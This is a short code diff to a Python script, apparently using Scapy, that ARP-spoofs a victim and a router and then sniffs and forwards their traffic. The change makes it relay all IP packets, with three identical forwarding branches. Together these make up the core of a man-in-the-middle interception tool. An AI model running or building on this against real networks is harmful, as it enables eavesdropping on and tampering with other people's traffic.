@@ -22,10 +22,13 @@ def arpSpoof(targetIp, spoofIp, iface):
 
 def forwardPacket(pkt, hostIp, routerIp, iface):
     # Forward packet depending on destination
-    if pkt.dst == hostIp and pkt.haslayer(IP):
-        sendp(pkt, iface=iface, verbose=False)
-    elif pkt.dst == routerIp and pkt.haslayer(IP):
-        sendp(pkt, iface=iface, verbose=False)
+    if pkt.haslayer(IP):
+        if pkt.dst == hostIp:
+            sendp(pkt, iface=iface, verbose=False)
+        elif pkt.dst == routerIp:
+            sendp(pkt, iface=iface, verbose=False)
+        else:
+            sendp(pkt, iface=iface, verbose=False)
 
 def sniffAndForward(hostIp, routerIp, iface):
     print(f"Starting packet sniffing on {iface}")
